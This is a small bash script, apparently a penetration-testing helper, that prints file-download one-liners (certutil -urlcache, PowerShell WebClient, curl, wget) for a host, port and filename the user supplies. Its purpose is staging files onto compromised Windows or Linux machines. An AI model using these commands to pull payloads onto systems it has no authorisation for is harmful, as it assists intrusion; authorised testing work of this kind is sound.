#!/bin/bash
#red     \e[91m
#green   \e[92m
#blue    \e[96m
#default \e[39m
url="http://\e[91m$1\e[39m:\e[92m$2\e[39m/\e[96m$3\e[39m"
echo "---------------------------------------------------------------------------------------------"
echo "Windows:"
echo -e "certutil -urlcache -f -split $url \e[96m$3\e[39m"
echo -e "(New-Object Net.WebClient).DownloadString('$url')"
echo -e "(New-Object System.Net.WebClient).DownloadFile('$url', '\e[96m$3\e[39m')"
echo "---------------------------------------------------------------------------------------------"
echo "linux:"
echo -e "curl '$url' -O"
echo -e "wget '$url'"
echo "---------------------------------------------------------------------------------------------"
